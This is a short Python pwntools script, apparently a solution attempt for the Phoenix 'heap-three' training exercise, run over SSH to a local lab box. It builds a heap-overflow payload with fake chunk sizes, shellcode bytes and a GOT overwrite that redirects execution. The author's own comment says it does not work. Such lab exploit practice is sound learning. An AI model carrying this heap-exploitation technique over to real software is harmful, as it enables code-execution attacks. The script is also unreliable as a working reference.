#!/usr/bin/python
from pwn import *
s = ssh(user='user', host='localhost', password='user', port=2222)
# doesn't work!
# global offset table address:
got=0x804c13c
# fill up a chunk and end it with 65 64 in hex is 100->length of next chunk
# add 1 to signify the next chunk on the heap is not free
exploit='/opt/phoenix/i486/heap-three '
# address of winner: 0x80487d5
''' shellcode:
    mov    eax,0x80487d5 store the address of winner in eax
    call   eax go to the function at the address stored in eax
'''
exploit+='$(echo -ne "\x68\xD5\x87\x04\x08\xC3") '
exploit+='$(python -c \'print 32*"b"+"\xfc\xff\xff\xff\xb0\xff\xff\xff"\') '
# since null bytes aren't allowed adding 0xfffffffc will overflow to 0x0000064
exploit+='$(python -c \'print 4*"c"+"'
# got-12 since heap is 12 bytes ahead
exploit+=p32(got-12)+'"+"'
# the heap address starts 8 bytes over
heap=0xf7e69012
exploit+=p32(heap)+'"\')'
print(s[exploit])
s.close()
